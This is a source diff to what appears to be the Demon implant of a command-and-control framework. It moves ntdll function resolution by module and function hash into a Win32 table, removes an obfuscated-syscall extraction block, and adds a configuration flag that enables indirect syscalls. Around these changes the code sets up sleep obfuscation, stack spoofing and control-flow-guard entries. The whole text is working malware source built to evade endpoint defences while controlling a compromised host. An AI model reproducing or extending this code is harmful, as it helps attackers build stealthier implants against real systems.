@@ -1,4 +1,4 @@
-#include "Demon.h"
+#include <Demon.h>
 
 /* Import Common Headers */
 #include <Common/Defines.h>
@@ -7,8 +7,9 @@
 /* Import Core Headers */
 #include <Core/Transport.h>
 #include <Core/SleepObf.h>
-#include <Core/WinUtils.h>
+#include <Core/Win32.h>
 #include <Core/MiniStd.h>
+#include <Core/SysNative.h>
 
 /* Import Inject Headers */
 #include <Inject/Inject.h>
@@ -31,8 +32,6 @@ SEC_DATA BYTE     AgentConfig[] = CONFIG_BYTES;
  * */
 VOID DemonMain( PVOID ModuleInst )
 {
-    PUTS( "Start" )
-
     /* Use passed module agent instance */
     if ( ModuleInst ) {
         Instance.Session.ModuleBase = ModuleInst;
@@ -40,9 +39,6 @@ VOID DemonMain( PVOID ModuleInst )
 
     /* Initialize Win32 API, Load Modules and Syscalls stubs (if we specified it) */
     DemonInit();
-
-    /* Parse config */
-    DemonConfig();
 
     /* Initialize MetaData */
     DemonMetaData( &Instance.MetaData, TRUE );
@@ -280,9 +276,11 @@ VOID DemonInit( VOID )
 
     /* resolve ntdll.dll functions */
     if ( ( Instance.Modules.Ntdll = LdrModulePeb( H_MODULE_NTDLL ) ) ) {
+        /* Module/Address function loading */
         Instance.Win32.LdrGetProcedureAddress            = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_LDRGETPROCEDUREADDRESS );
         Instance.Win32.LdrLoadDll                        = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_LDRLOADDLL );
 
+        /* Rtl functions */
         Instance.Win32.RtlAllocateHeap                   = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_RTLALLOCATEHEAP );
         Instance.Win32.RtlReAllocateHeap                 = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_RTLREALLOCATEHEAP );
         Instance.Win32.RtlFreeHeap                       = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_RTLFREEHEAP );
@@ -300,12 +298,42 @@ VOID DemonInit( VOID )
         Instance.Win32.RtlRemoveVectoredExceptionHandler = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_RTLREMOVEVECTOREDEXCEPTIONHANDLER );
         Instance.Win32.RtlCopyMappedMemory               = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_RTLCOPYMAPPEDMEMORY );
 
+        /* Native functions */
         Instance.Win32.NtClose                           = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTCLOSE );
         Instance.Win32.NtCreateEvent                     = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTCREATEEVENT );
         Instance.Win32.NtSetEvent                        = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTSETEVENT );
         Instance.Win32.NtSetInformationThread            = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTSETINFORMATIONTHREAD );
         Instance.Win32.NtSetInformationVirtualMemory     = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTSETINFORMATIONVIRTUALMEMORY );
         Instance.Win32.NtGetNextThread                   = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTGETNEXTTHREAD );
+        Instance.Win32.NtOpenProcess                     = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTOPENPROCESS );
+        Instance.Win32.NtQueryInformationProcess         = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTQUERYINFORMATIONPROCESS );
+        Instance.Win32.NtQuerySystemInformation          = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTQUERYSYSTEMINFORMATION );
+        Instance.Win32.NtAllocateVirtualMemory           = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTALLOCATEVIRTUALMEMORY );
+        Instance.Win32.NtQueueApcThread                  = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTQUEUEAPCTHREAD );
+        Instance.Win32.NtOpenThread                      = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTOPENTHREAD );
+        Instance.Win32.NtResumeThread                    = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTRESUMETHREAD );
+        Instance.Win32.NtSuspendThread                   = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTSUSPENDTHREAD );
+        Instance.Win32.NtCreateEvent                     = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTCREATEEVENT );
+        Instance.Win32.NtDuplicateObject                 = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTDUPLICATEOBJECT );
+        Instance.Win32.NtGetContextThread                = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTGETCONTEXTTHREAD );
+        Instance.Win32.NtSetContextThread                = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTSETCONTEXTTHREAD );
+        Instance.Win32.NtWaitForSingleObject             = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTWAITFORSINGLEOBJECT );
+        Instance.Win32.NtAlertResumeThread               = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTALERTRESUMETHREAD );
+        Instance.Win32.NtSignalAndWaitForSingleObject    = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTSIGNALANDWAITFORSINGLEOBJECT );
+        Instance.Win32.NtTestAlert                       = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTTESTALERT );
+        Instance.Win32.NtCreateThreadEx                  = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTCREATETHREADEX );
+        Instance.Win32.NtOpenProcessToken                = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTOPENPROCESSTOKEN );
+        Instance.Win32.NtDuplicateToken                  = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTDUPLICATETOKEN );
+        Instance.Win32.NtProtectVirtualMemory            = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTPROTECTVIRTUALMEMORY  );
+        Instance.Win32.NtTerminateThread                 = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTTERMINATETHREAD );
+        Instance.Win32.NtWriteVirtualMemory              = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTWRITEVIRTUALMEMORY );
+        Instance.Win32.NtContinue                        = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTCONTINUE );
+        Instance.Win32.NtReadVirtualMemory               = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTREADVIRTUALMEMORY );
+        Instance.Win32.NtFreeVirtualMemory               = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTFREEVIRTUALMEMORY );
+        Instance.Win32.NtQueryVirtualMemory              = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTQUERYVIRTUALMEMORY );
+        Instance.Win32.NtQueryInformationToken           = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTQUERYINFORMATIONTOKEN );
+        Instance.Win32.NtQueryInformationThread          = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTQUERYINFORMATIONTHREAD );
+        Instance.Win32.NtQueryObject                     = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTQUERYOBJECT );
     } else {
         PUTS( "Failed to load ntdll from PEB" )
         return;
@@ -399,87 +427,6 @@ VOID DemonInit( VOID )
         Instance.Win32.GetSystemTimeAsFileTime         = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_GETSYSTEMTIMEASFILETIME );
         Instance.Win32.GetLocalTime                    = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_GETLOCALTIME );
         Instance.Win32.DuplicateHandle                 = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_DUPLICATEHANDLE );
-    }
-
-#ifdef OBF_SYSCALL
-    if ( Instance.Session.OSVersion > WIN_VERSION_10 )
-    {
-        PUTS( "Obfuscated Syscall" );
-        SyscallsInit();
-
-        PSYSCALL_STUB   Syscalls        = Instance.Win32.LocalAlloc( LPTR, sizeof( SYSCALL_STUB ) * MAX_NUMBER_OF_SYSCALLS );
-        HMODULE         pNtdll          = SyscallLdrNtdll();
-        DWORD           SyscallCounter  = SyscallsExtract( U_PTR( pNtdll ), Syscalls );
-
-        Instance.Syscall.NtOpenProcess                  = SyscallsObf( Syscalls, SyscallCounter, H_FUNC_NTOPENPROCESS );
-        Instance.Syscall.NtQueryInformationProcess      = SyscallsObf( Syscalls, SyscallCounter, H_FUNC_NTQUERYINFORMATIONPROCESS );
-        Instance.Syscall.NtQuerySystemInformation       = SyscallsObf( Syscalls, SyscallCounter, H_FUNC_NTQUERYSYSTEMINFORMATION );
-        Instance.Syscall.NtAllocateVirtualMemory        = SyscallsObf( Syscalls, SyscallCounter, H_FUNC_NTALLOCATEVIRTUALMEMORY );
-        Instance.Syscall.NtQueueApcThread               = SyscallsObf( Syscalls, SyscallCounter, H_FUNC_NTQUEUEAPCTHREAD );
-        Instance.Syscall.NtOpenThread                   = SyscallsObf( Syscalls, SyscallCounter, H_FUNC_NTOPENTHREAD );
-        Instance.Syscall.NtResumeThread                 = SyscallsObf( Syscalls, SyscallCounter, H_FUNC_NTRESUMETHREAD );
-        Instance.Syscall.NtSuspendThread                = SyscallsObf( Syscalls, SyscallCounter, H_FUNC_NTSUSPENDTHREAD );
-        Instance.Syscall.NtCreateEvent                  = SyscallsObf( Syscalls, SyscallCounter, H_FUNC_NTCREATEEVENT );
-        Instance.Syscall.NtDuplicateObject              = SyscallsObf( Syscalls, SyscallCounter, H_FUNC_NTDUPLICATEOBJECT );
-        Instance.Syscall.NtGetContextThread             = SyscallsObf( Syscalls, SyscallCounter, H_FUNC_NTGETCONTEXTTHREAD );
-        Instance.Syscall.NtSetContextThread             = SyscallsObf( Syscalls, SyscallCounter, H_FUNC_NTSETCONTEXTTHREAD );
-        Instance.Syscall.NtWaitForSingleObject          = SyscallsObf( Syscalls, SyscallCounter, H_FUNC_NTWAITFORSINGLEOBJECT );
-        Instance.Syscall.NtAlertResumeThread            = SyscallsObf( Syscalls, SyscallCounter, H_FUNC_NTALERTRESUMETHREAD );
-        Instance.Syscall.NtSignalAndWaitForSingleObject = SyscallsObf( Syscalls, SyscallCounter, H_FUNC_NTSIGNALANDWAITFORSINGLEOBJECT );
-        Instance.Syscall.NtTestAlert                    = SyscallsObf( Syscalls, SyscallCounter, H_FUNC_NTTESTALERT );
-        Instance.Syscall.NtCreateThreadEx               = SyscallsObf( Syscalls, SyscallCounter, H_FUNC_NTCREATETHREADEX );
-        Instance.Syscall.NtOpenProcessToken             = SyscallsObf( Syscalls, SyscallCounter, H_FUNC_NTOPENPROCESSTOKEN );
-        Instance.Syscall.NtDuplicateToken               = SyscallsObf( Syscalls, SyscallCounter, H_FUNC_NTDUPLICATETOKEN );
-        Instance.Syscall.NtProtectVirtualMemory         = SyscallsObf( Syscalls, SyscallCounter, H_FUNC_NTPROTECTVIRTUALMEMORY );
-        Instance.Syscall.NtTerminateThread              = SyscallsObf( Syscalls, SyscallCounter, H_FUNC_NTTERMINATETHREAD );
-        Instance.Syscall.NtWriteVirtualMemory           = SyscallsObf( Syscalls, SyscallCounter, H_FUNC_NTWRITEVIRTUALMEMORY );
-        Instance.Syscall.NtContinue                     = SyscallsObf( Syscalls, SyscallCounter, H_FUNC_NTCONTINUE );
-        Instance.Syscall.NtReadVirtualMemory            = SyscallsObf( Syscalls, SyscallCounter, H_FUNC_NTREADVIRTUALMEMORY );
-        Instance.Syscall.NtFreeVirtualMemory            = SyscallsObf( Syscalls, SyscallCounter, H_FUNC_NTFREEVIRTUALMEMORY );
-        Instance.Syscall.NtQueryVirtualMemory           = SyscallsObf( Syscalls, SyscallCounter, H_FUNC_NTQUERYVIRTUALMEMORY );
-        Instance.Syscall.NtQueryInformationToken        = SyscallsObf( Syscalls, SyscallCounter, H_FUNC_NTQUERYINFORMATIONTOKEN );
-        Instance.Syscall.NtQueryObject                  = SyscallsObf( Syscalls, SyscallCounter, H_FUNC_NTQUERYOBJECT );
-
-        MemSet( Syscalls, 0, sizeof( SYSCALL_STUB ) * MAX_NUMBER_OF_SYSCALLS );
-        Instance.Win32.LocalFree( Syscalls );
-        Syscalls = NULL;
-
-        /* restore ntdll */
-        Instance.Modules.Ntdll = LdrModulePeb( H_MODULE_NTDLL );
-    }
-    else
-#endif
-    {
-        PUTS( "Using Native functions..." )
-        Instance.Syscall.NtOpenProcess                  = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTOPENPROCESS );
-        Instance.Syscall.NtQueryInformationProcess      = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTQUERYINFORMATIONPROCESS );
-        Instance.Syscall.NtQuerySystemInformation       = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTQUERYSYSTEMINFORMATION );
-        Instance.Syscall.NtAllocateVirtualMemory        = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTALLOCATEVIRTUALMEMORY );
-        Instance.Syscall.NtQueueApcThread               = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTQUEUEAPCTHREAD );
-        Instance.Syscall.NtOpenThread                   = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTOPENTHREAD );
-        Instance.Syscall.NtResumeThread                 = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTRESUMETHREAD );
-        Instance.Syscall.NtSuspendThread                = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTSUSPENDTHREAD );
-        Instance.Syscall.NtCreateEvent                  = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTCREATEEVENT );
-        Instance.Syscall.NtDuplicateObject              = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTDUPLICATEOBJECT );
-        Instance.Syscall.NtGetContextThread             = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTGETCONTEXTTHREAD );
-        Instance.Syscall.NtSetContextThread             = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTSETCONTEXTTHREAD );
-        Instance.Syscall.NtWaitForSingleObject          = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTWAITFORSINGLEOBJECT );
-        Instance.Syscall.NtAlertResumeThread            = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTALERTRESUMETHREAD );
-        Instance.Syscall.NtSignalAndWaitForSingleObject = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTSIGNALANDWAITFORSINGLEOBJECT );
-        Instance.Syscall.NtTestAlert                    = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTTESTALERT );
-        Instance.Syscall.NtCreateThreadEx               = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTCREATETHREADEX );
-        Instance.Syscall.NtOpenProcessToken             = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTOPENPROCESSTOKEN );
-        Instance.Syscall.NtDuplicateToken               = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTDUPLICATETOKEN );
-        Instance.Syscall.NtProtectVirtualMemory         = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTPROTECTVIRTUALMEMORY  );
-        Instance.Syscall.NtTerminateThread              = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTTERMINATETHREAD );
-        Instance.Syscall.NtWriteVirtualMemory           = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTWRITEVIRTUALMEMORY );
-        Instance.Syscall.NtContinue                     = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTCONTINUE );
-        Instance.Syscall.NtReadVirtualMemory            = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTREADVIRTUALMEMORY );
-        Instance.Syscall.NtFreeVirtualMemory            = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTFREEVIRTUALMEMORY );
-        Instance.Syscall.NtQueryVirtualMemory           = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTQUERYVIRTUALMEMORY );
-        Instance.Syscall.NtQueryInformationToken        = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTQUERYINFORMATIONTOKEN );
-        Instance.Syscall.NtQueryInformationThread       = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTQUERYINFORMATIONTHREAD );
-        Instance.Syscall.NtQueryObject                  = LdrFunctionAddr( Instance.Modules.Ntdll, H_FUNC_NTQUERYOBJECT );
     }
 
     ModuleName[ 0 ] = 'A';
@@ -815,7 +762,7 @@ VOID DemonInit( VOID )
 
     PUTS( "Set basic info" )
 
-    if ( ! NT_SUCCESS( Instance.Syscall.NtQuerySystemInformation( SystemProcessorInformation, &SystemInfo, sizeof( SYSTEM_PROCESSOR_INFORMATION ), 0 ) ) ) {
+    if ( ! NT_SUCCESS( Instance.Win32.NtQuerySystemInformation( SystemProcessorInformation, &SystemInfo, sizeof( SYSTEM_PROCESSOR_INFORMATION ), 0 ) ) ) {
         PUTS( "[!] NtQuerySystemInformation Failed" );
     }
 
@@ -849,9 +796,9 @@ VOID DemonInit( VOID )
         PUTS( "Adding required function module &addresses to the cfg list"  );
 
         /* common functions */
-        CfgAddressAdd( Instance.Modules.Ntdll,    Instance.Syscall.NtContinue );
-        CfgAddressAdd( Instance.Modules.Ntdll,    Instance.Syscall.NtSetContextThread );
-        CfgAddressAdd( Instance.Modules.Ntdll,    Instance.Syscall.NtGetContextThread );
+        CfgAddressAdd( Instance.Modules.Ntdll,    Instance.Win32.NtContinue );
+        CfgAddressAdd( Instance.Modules.Ntdll,    Instance.Win32.NtSetContextThread );
+        CfgAddressAdd( Instance.Modules.Ntdll,    Instance.Win32.NtGetContextThread );
         CfgAddressAdd( Instance.Modules.Advapi32, Instance.Win32.SystemFunction032 );
 
         /* ekko sleep obf */
@@ -860,13 +807,26 @@ VOID DemonInit( VOID )
         CfgAddressAdd( Instance.Modules.Ntdll,    Instance.Win32.NtSetEvent );
 
         /* foliage sleep obf */
-        CfgAddressAdd( Instance.Modules.Ntdll, Instance.Syscall.NtTestAlert );
-        CfgAddressAdd( Instance.Modules.Ntdll, Instance.Syscall.NtWaitForSingleObject );
-        CfgAddressAdd( Instance.Modules.Ntdll, Instance.Syscall.NtProtectVirtualMemory );
+        CfgAddressAdd( Instance.Modules.Ntdll, Instance.Win32.NtTestAlert );
+        CfgAddressAdd( Instance.Modules.Ntdll, Instance.Win32.NtWaitForSingleObject );
+        CfgAddressAdd( Instance.Modules.Ntdll, Instance.Win32.NtProtectVirtualMemory );
         CfgAddressAdd( Instance.Modules.Ntdll, Instance.Win32.RtlExitUserThread );
     }
 
     PRINTF( "Instance DemonID => %x\n", Instance.Session.AgentID )
+
+    /* Parse config */
+    DemonConfig();
+
+    /* now do post init stuff after parsing the config */
+    if ( Instance.Config.Implant.SysIndirect )
+    {
+        /* Initialize indirect syscalls + get SSN from every single syscall we need */
+        if  ( ! SysInitialize( Instance.Modules.Ntdll ) ) {
+            PUTS( "Failed to Initialize syscalls" )
+            /* NOTE: the agent is going to keep going for now. */
+        }
+    }
 }
 
 VOID DemonConfig()
@@ -915,14 +875,17 @@ VOID DemonConfig()
 
     Instance.Config.Implant.SleepMaskTechnique = ParserGetInt32( &Parser );
     Instance.Config.Implant.StackSpoof         = ParserGetInt32( &Parser );
+    Instance.Config.Implant.SysIndirect        = ParserGetInt32( &Parser );
     Instance.Config.Implant.DownloadChunkSize  = 512000; /* 512k by default. */
 
     PRINTF(
         "[CONFIG] Sleep Obfuscation: \n"
         " - Technique: %d \n"
-        " - Stack Dup: %s \n",
+        " - Stack Dup: %s \n"
+        "[CONFIG] SysIndirect: %s\n",
         Instance.Config.Implant.SleepMaskTechnique,
-        Instance.Config.Implant.StackSpoof ? "TRUE" : "FALSE"
+        Instance.Config.Implant.StackSpoof ? "TRUE" : "FALSE",
+        Instance.Config.Implant.SysIndirect ? "TRUE" : "FALSE"
     )
 
 #ifdef TRANSPORT_HTTP
